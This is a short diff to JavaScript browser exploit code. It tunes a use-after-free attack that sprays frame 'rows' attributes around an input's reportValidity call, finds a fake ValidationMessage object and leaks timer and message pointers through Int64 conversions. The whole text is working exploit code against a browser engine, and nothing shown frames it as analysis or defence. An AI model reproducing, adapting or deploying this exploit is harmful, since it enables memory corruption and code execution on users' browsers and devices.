@@ -427,13 +427,13 @@ function dumpTargetObj() {
 
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
-		if (!Int64.fromDouble(g_arr_ab_1[i][1]).equals(Int64.Zero)) {
+		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
 			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
-				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
-				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
-				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][0]);
+				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
+				g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
+				g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
 				g_round++;
 			}
 
@@ -459,14 +459,14 @@ function prepareUAF() {
 	div.appendChild(g_input);
 
 	/* First half spray */
-	for (let i = 0; i < NB_FRAMES / 4; i++)
+	for (let i = 0; i < NB_FRAMES / 2; i++)
 		g_frames[i].setAttribute("rows", g_rows1);
 
 	/* Instantiate target obj */
 	g_input.reportValidity();
 
 	/* ... and the second half */
-	for (let i = NB_FRAMES / 4; i < NB_FRAMES; i++)
+	for (let i = NB_FRAMES / 2; i < NB_FRAMES; i++)
 		g_frames[i].setAttribute("rows", g_rows2);
 
 	g_input.setAttribute("onfocus", "reuseTargetObj()");
